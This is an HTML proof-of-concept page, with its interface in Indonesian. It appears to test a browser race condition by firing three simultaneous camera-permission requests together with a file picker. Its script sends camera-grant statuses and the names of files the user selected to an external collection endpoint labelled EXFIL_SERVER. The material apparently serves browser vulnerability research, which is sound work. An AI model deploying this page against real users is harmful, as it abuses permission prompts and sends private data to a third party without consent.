<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Uji Coba Keamanan Browser - Race Condition</title>
</head>
<body>
    <button id="trigger-btn" style="padding: 20px; font-size: 20px; cursor: pointer;">
        Klik untuk Memulai Uji Coba (Race Condition)
    </button>

    <script>
        const EXFIL_SERVER = "https://browser-bug-poc.free.beeceptor.com";

        // Fungsi untuk menangani logika kamera
        async function runCameraTest(id) {
            try {
                console.log(`Mencoba akses kamera #${id}...`);
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                
                // Jika berhasil, kirim notifikasi bahwa akses diberikan
                fetch(EXFIL_SERVER, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ status: `Akses kamera #${id} diberikan` }),
                    keepalive: true
                });

                // Hentikan stream segera
                stream.getTracks().forEach(t => t.stop());
            } catch (err) {
                console.error(`Akses kamera #${id} ditolak:`, err);
            }
        }

        document.getElementById('trigger-btn').addEventListener('click', async () => {
            console.log("Memulai proses race condition...");

            // 1. Uji File Picker (tetap ada)
            const input = document.createElement('input');
            input.type = 'file';
            input.accept = 'image/*';
            input.onchange = (e) => {
                const file = e.target.files[0];
                const reader = new FileReader();
                reader.onload = (ev) => {
                    fetch(EXFIL_SERVER, {
                        method: 'POST',
                        body: JSON.stringify({ type: 'file_uploaded', name: file.name }),
                        keepalive: true
                    });
                };
                reader.readAsDataURL(file);
            };
            input.click();

            // 2. Uji Akses Kamera (Memicu 3x secara bersamaan / Race Condition)
            runCameraTest(1);
            runCameraTest(2);
            runCameraTest(3);
        });
    </script>
</body>
</html>
